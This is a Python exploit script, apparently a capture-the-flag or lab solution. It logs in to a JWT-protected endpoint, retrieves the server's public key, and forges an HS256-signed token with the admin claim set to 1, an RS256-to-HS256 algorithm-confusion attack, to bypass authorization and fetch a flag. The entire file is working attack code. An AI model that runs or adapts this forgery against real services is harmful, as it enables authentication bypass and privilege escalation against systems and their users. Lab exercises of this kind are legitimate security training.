import requests
import json
import hmac
import hashlib
import base64

# --- Configuration ---
TARGET_IP = "10.64.168.127"
AUTH_URL = f"http://{TARGET_IP}/api/v1.0/example5"
FLAG_URL = f"http://{TARGET_IP}/api/v1.0/example5?username=admin"
USERNAME = "user"
PASSWORD = "password5"
# ---------------------

def base64url_encode(data):
    """Encodes bytes to Base64URL string (removes padding, replaces chars)"""
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')

def sign_token(header_b64, payload_b64, secret_key):
    """
    Manually calculates the HS256 signature using the public key as the secret.
    This bypasses pyjwt's key validation check.
    """
    # Data to sign is the encoded header and payload joined by a dot
    data_to_sign = f"{header_b64}.{payload_b64}".encode('utf-8')
    
    # Calculate HMAC-SHA256 signature
    signature_bytes = hmac.new(
        secret_key.encode('utf-8'),
        data_to_sign,
        hashlib.sha256
    ).digest()
    
    # Base64URL encode the signature
    return base64url_encode(signature_bytes)

def forge_jwt_token(public_key):
    """
    Forges the JWT by changing the algorithm to HS256 and admin to 1,
    then signing it with the public key as the secret.
    """
    print("[*] Forging Malicious Token...")

    # 1. Malicious Header (RS256 -> HS256)
    # Decoded: {"typ":"JWT","alg":"HS256"}
    header_b64 = base64url_encode(json.dumps({"typ":"JWT","alg":"HS256"}).encode('utf-8'))
    
    # 2. Malicious Payload (admin: 0 -> 1)
    payload = {
        'username': USERNAME,
        'admin': 1
    }
    payload_b64 = base64url_encode(json.dumps(payload).encode('utf-8'))
    
    # 3. Sign the token using the full public key as the HS256 secret
    signature_b64 = sign_token(header_b64, payload_b64, public_key)
    
    # Final JWT structure: Header.Payload.Signature
    forged_token = f"{header_b64}.{payload_b64}.{signature_b64}"
    
    print(f"[+] Forged JWT: {forged_token}")
    return forged_token

def exploit_example5():
    # Step 1: Authenticate to retrieve public key and original token
    print(f"[*] Sending initial authentication request to {AUTH_URL}")
    auth_data = json.dumps({"username": USERNAME, "password": PASSWORD})
    
    try:
        response = requests.post(
            AUTH_URL,
            data=auth_data,
            headers={'Content-Type': 'application/json'}
        )
        response.raise_for_status() # Raise exception for bad status codes
    except requests.exceptions.RequestException as e:
        print(f"[-] HTTP Request Failed: {e}")
        return

    try:
        data = response.json()
        if 'public_key' not in data:
            print("[-] Error: 'public_key' not found in response.")
            print(f"Response: {data}")
            return

        public_key = data['public_key']
        print(f"[+] Public Key Retrieved: {public_key[:60]}...")
    except json.JSONDecodeError:
        print(f"[-] Error: Failed to decode JSON response. Received: {response.text}")
        return

    # Step 2: Forge the malicious JWT
    forged_token = forge_jwt_token(public_key)

    # Step 3: Use the forged token to get the flag
    print(f"\n[*] Sending final request with forged token to {FLAG_URL}")
    flag_response = requests.get(
        FLAG_URL,
        headers={'Authorization': f'Bearer {forged_token}'}
    )

    print("-" * 50)
    print(f"Request URL: {FLAG_URL}")
    print(f"Response Status: {flag_response.status_code}")
    print("Response Body (Flag likely here):")
    print(flag_response.text.strip())
    print("-" * 50)


if __name__ == "__main__":
    exploit_example5()